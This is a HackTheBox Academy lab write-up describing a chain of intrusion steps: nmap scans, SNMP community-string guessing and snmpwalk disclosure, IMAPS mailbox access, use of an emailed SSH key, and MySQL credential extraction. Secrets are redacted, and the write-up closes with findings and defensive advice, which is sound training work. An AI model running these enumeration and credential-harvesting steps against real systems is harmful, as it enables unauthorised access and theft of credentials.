# NIXHARD — SNMP, IMAP, SSH Key and MySQL Credential Chain

> HTB Academy lab write-up. All IP addresses, passwords and private keys are intentionally redacted. Replace `<TARGET_IP>` with the IP assigned to your current lab instance. Never commit real credentials or private keys to a public repository.

## Objective

The target is an internal MX and management server. It also stores backups related to internal domain accounts. The goal is to recover the credentials of the `HTB` user.

## Attack chain

```text
TCP enumeration
    ↓
UDP enumeration
    ↓
SNMP community string: backup
    ↓
SNMP information disclosure
    ↓
Credentials for user tom
    ↓
IMAPS mailbox access
    ↓
Private SSH key received by email
    ↓
SSH access as tom
    ↓
MySQL database users
    ↓
Credentials for HTB
```

## 1. TCP enumeration

```bash
sudo nmap -sV -sC -A -T4 -p- <TARGET_IP>
```

Relevant options:

- `-sV` — detect service versions;
- `-sC` — run default NSE scripts;
- `-A` — enable extended OS, version and script detection;
- `-T4` — use a faster timing profile;
- `-p-` — scan all TCP ports.

Discovered services:

| Port | Service | Observation |
|---:|---|---|
| 22/tcp | SSH | OpenSSH on Ubuntu; password authentication was disabled |
| 110/tcp | POP3 | Dovecot |
| 143/tcp | IMAP | Dovecot with STARTTLS |
| 993/tcp | IMAPS | Dovecot over TLS |
| 995/tcp | POP3S | Dovecot over TLS |

The initial scan did not show SNMP because `-p-` covers TCP ports only. UDP must be scanned separately.

## 2. UDP enumeration

```bash
sudo nmap --top-ports=100 -sU <TARGET_IP>
```

Relevant result:

```text
68/udp   open|filtered  dhcpc
161/udp  open            snmp
```

Port `161/udp` became the main lead. SNMP can expose system information, running processes, command arguments and configuration data.

A more focused check was then performed:

```bash
sudo nmap -sU -sV -sC -p161 <TARGET_IP>
```

Nmap identified Net-SNMP and reported SNMPv3 support. This did not prove that SNMPv1/v2c were disabled; multiple SNMP versions can be enabled simultaneously.

## 3. SNMP community discovery

The first SNMPv3 attempt used an SNMPv2c-style community option:

```bash
snmpwalk -v3 -c public <TARGET_IP>
```

This failed with:

```text
No securityName specified
```

SNMPv3 requires a security username and security level. The `-c` option is used with SNMPv1/v2c.

Several possible SNMPv3 usernames were tested with `noAuthNoPriv`, but the server returned `Unknown user name`.

Since SNMPv1/v2c could still be enabled, common community strings were tested:

```bash
onesixtyone \
  -c /usr/share/seclists/Discovery/SNMP/snmp.txt \
  <TARGET_IP>
```

The scan identified the community string:

```text
backup
```

`backup` is an SNMP community string, not a Linux password.

## 4. SNMP information disclosure

Full read access was obtained with SNMPv2c:

```bash
snmpwalk -v2c -c backup <TARGET_IP> > snmp_backup.txt
```

The dump disclosed information such as:

```text
Linux NIXHARD 5.4.0-90-generic ... x86_64
Admin <tech@inlanefreight.htb>
```

The most important entries exposed a recovery script and its arguments:

```text
/opt/tom-recovery.sh
tom <REDACTED_PASSWORD>
```

This revealed valid credentials for the internal user `tom`:

```text
Username: tom
Password: <REDACTED>
```

The issue was caused by sensitive command/script parameters being visible through the SNMP management interface.

Useful branches for manual SNMP enumeration include:

```bash
snmpwalk -v2c -c backup <TARGET_IP> 1.3.6.1.2.1.1
snmpwalk -v2c -c backup <TARGET_IP> 1.3.6.1.2.1.25.4
snmpwalk -v2c -c backup <TARGET_IP> 1.3.6.1.2.1.25.2
snmpwalk -v2c -c backup <TARGET_IP> 1.3.6.1.2.1.25.6.3
```

## 5. Testing the recovered credentials

SSH password authentication was disabled. Testing the credentials with SSH produced:

```text
Permission denied (publickey)
```

This indicates an authentication-method restriction, not necessarily an incorrect password.

The same credentials were tested against IMAPS:

```bash
curl -v \
  --url 'imaps://<TARGET_IP>:993/INBOX' \
  --user 'tom:<REDACTED>' \
  --insecure
```

The server returned a mailbox listing, confirming successful authentication.

For interactive IMAP access:

```bash
openssl s_client -connect <TARGET_IP>:993 -crlf
```

The port is important. Without `:993`, OpenSSL attempts to connect to port 443 by default.

Example IMAP interaction:

```text
a1 LOGIN tom <REDACTED>
a2 LIST "" "*"
a3 SELECT INBOX
a4 SEARCH ALL
a5 FETCH 1:* BODY.PEEK[]
```

`BODY.PEEK[]` retrieves the message without marking it as read.

The mailbox contained the folders `Notes`, `Meetings`, `Important` and `INBOX`. `Important` was empty, while `INBOX` contained one message.

## 6. Private SSH key in the mailbox

The message in `INBOX` had the subject `KEY` and contained an OpenSSH private key. The key was sent to `tom` by the internal administrator and included the comment:

```text
tom@NIXHARD
```

Only the block below should be saved; email headers and SMTP transcript data must not be included:

```text
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

The key was saved locally and protected:

```bash
nano tom_id_rsa
chmod 600 tom_id_rsa
```

SSH access was then obtained with:

```bash
ssh -o IdentitiesOnly=yes \
    -i ./tom_id_rsa \
    tom@<TARGET_IP>
```

`IdentitiesOnly=yes` ensures that SSH uses the specified key rather than trying unrelated keys from the agent or default key locations.

## 7. MySQL enumeration

After obtaining a shell as `tom`, local files and shell history were reviewed. A MySQL login was available.

Database enumeration:

```sql
SELECT VERSION();
SHOW DATABASES;
```

The database list included:

```text
information_schema
mysql
performance_schema
sys
users
```

The `users` database was selected:

```sql
USE users;
SHOW TABLES;
```

The table structure was inspected before querying data:

```sql
DESCRIBE users;
```

The relevant row contained the credentials for `HTB`:

```text
Username: HTB
Password: <REDACTED>
```

A typical targeted query is:

```sql
SELECT *
FROM users
WHERE username = 'HTB';
```

If a multiline MySQL query becomes stuck at the `->` prompt, cancel it with:

```sql
\c
```

Every SQL statement should be terminated with `;`.

## Findings

### Finding 1 — Weak SNMP community string

The community string `backup` was discoverable using a standard wordlist and granted read access to sensitive host information.

### Finding 2 — Sensitive data exposed through SNMP

SNMP exposed a recovery script path and command arguments containing credentials for `tom`.

### Finding 3 — Credentials reused across services

The credentials obtained through SNMP were valid for the mail service.

### Finding 4 — Private SSH key stored in email

An unencrypted private SSH key was sent through an internal mailbox. Mailbox access therefore became equivalent to SSH access.

### Finding 5 — Credentials stored in a database in recoverable form

The `users` database contained the password for `HTB` in a directly usable form rather than a properly protected password representation.

## Defensive recommendations

- Disable SNMPv1/v2c where possible and use SNMPv3 with authentication and privacy.
- Replace predictable community strings such as `backup` with strong, unique values.
- Restrict SNMP access by source IP and firewall UDP/161 from untrusted networks.
- Never expose passwords or secret command arguments through SNMP extend/process data.
- Do not send private SSH keys through email.
- Protect private keys with passphrases and rotate exposed keys immediately.
- Disable password reuse across mail, SSH and database services.
- Store application passwords using a modern password-hashing scheme such as Argon2id or bcrypt.
- Restrict database permissions according to least privilege.
- Remove or rotate all credentials discovered during the assessment.
- Monitor SNMP access and mailbox access for unusual activity.

## Lessons learned

1. Always scan TCP and UDP separately.
2. A service-version result does not necessarily describe every enabled protocol variant.
3. SNMP can leak more than system banners; process and script parameters are especially valuable.
4. `Permission denied (publickey)` means the server may reject password authentication before checking the password.
5. Mail services are often an important pivot point for internal credentials and SSH keys.
6. IMAP requires tagged commands such as `a1 SELECT INBOX` and `a2 FETCH ...`.
7. SQL syntax errors often come from missing semicolons, typos or unknown column names.
8. Credentials and private keys must be redacted from public write-ups.

## Conclusion

The target was compromised through a multi-stage information-disclosure chain rather than a single software exploit:

```text
SNMP misconfiguration
→ tom credentials
→ IMAPS access
→ private SSH key
→ SSH shell
→ MySQL users database
→ HTB credentials
```

The central security failure was the exposure of sensitive operational data through a weakly protected SNMP service, which enabled access to the mail account and ultimately to the internal database.
